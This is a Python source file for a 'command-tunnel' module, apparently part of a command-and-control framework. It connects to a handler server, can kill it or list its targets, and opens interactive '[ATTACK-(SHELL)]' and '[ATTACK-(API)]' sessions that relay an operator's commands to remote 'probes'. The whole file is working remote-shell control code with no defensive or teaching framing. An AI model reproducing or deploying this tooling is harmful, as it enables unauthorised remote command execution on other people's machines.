def TUNNEL_MODULE(args):

	from socket import socket
	from time import sleep
	from threading import Thread
	BUFFER_SIZE=1024*1024

	def recv_data(sock):
		print("[+] I/O RECV THREAD [RUNNING]....")
		while True:
			try:
				data = sock.recv(BUFFER_SIZE)
				print(data.decode())
			except:
				sleep(0.1)

	try:
		addr = args[1].split(":")
		handler_addr = (addr[0],int(addr[1]))
		s = socket()

		if args[0] == "-k":
			s.connect(handler_addr)
			print("[+] Connected @ {}".format(args[1]))
			print("[*] Sending Kill Signal to Handler Server @ {}".format(args[1]))
			try:
				cmd = b"KILL"
				s.send(cmd)
				s.close()
			except Exception as e:
				print("[!] Error on killing handler : {}".format(e))

		elif args[0] == "-l":
			s.connect(handler_addr)
			print("[+] Connected @ {}".format(args[1]))
			try:
				cmd = b"LIST"
				s.send(cmd)
				s.close()
			except Exception as e:
				print("[!] Exception on accessing handler : {}".format(e))

		elif args[0] == "-c":
			timeout = int(args[3])
			s.settimeout(timeout)
			s.connect(handler_addr)
			print("[+] Connected @ {} :[SOCK-RECV-TIMEMOUT == {}s]".format(args[1],timeout))

			cmd = "CONN:{}".format(args[2]).encode()
			s.send(cmd)
			while True:

				mode = input("Set Mode :> ")

				if mode != "":
					if mode == "shell":
						s.send(b"[SHELL:MODE]")
						recv_thread = Thread(target=recv_data,args=(s,))
						recv_thread.start()
						while True:
							cmd_str = input("[ATTACK-(SHELL)] :# ")
							if cmd_str == "exit-mode":
								s.send(b"[SHELL:MODE]")
								break
							else:
								try:
									s.send(cmd_str.encode())

								except Exception as e:
									print("[!] [SHELL]:[EXCEPTION] : %s" % e)
									pass

					elif mode == "api":
						s.send(b"[API:MODE]")
						while True:
							cmd_str = input("[ATTACK-(API)] :> ")
							if cmd_str == "exit-mode":
								s.send(b"[API:MODE]")
								break
							else:
								try:
									s.send(cmd_str.encode())

								except Exception as e:
									print("[!] [API]:[EXCEPTION] : %s" % e)
									pass

					elif mode == "exit":
						print("[-] Shutting Down Command Tunnel...")
						break

					else:
						print("[!] Invalid Shell Mode")

		else:
			print("Usage : command-tunnel -l <handler-tunnel-address>: e.g tunnel -l 127.0.0.1:9000")
			print("Usage : command-tunnel -k <handler-tunnel-address>: e.g tunnel -k 127.0.0.1:9000")
			print("Usage : command-tunnel -c <handler-tunnel-address> <probe-index> <sock-recv-timeout>")

	except IndexError:
		print("Usage : command-tunnel -l <handler-tunnel-address>: e.g tunnel -l 127.0.0.1:9000")
		print("Usage : command-tunnel -k <handler-tunnel-address>: e.g tunnel -k 127.0.0.1:9000")
		print("Usage : command-tunnel -c <handler-tunnel-address> <probe-index> <sock-recv-timeout>: e.g tunnel -c 127.0.0.1:9000 0 2")

	except Exception as e:
		print("[TUNNEL_MODULE_EXCEPTION] : {}".format(e))

MODULE_NAME="command-tunnel"
self.bind_module({MODULE_NAME:TUNNEL_MODULE,'id':MODULE_NAME})
print("\t[+] Module :-> ({}) : [LOADED]".format(MODULE_NAME))

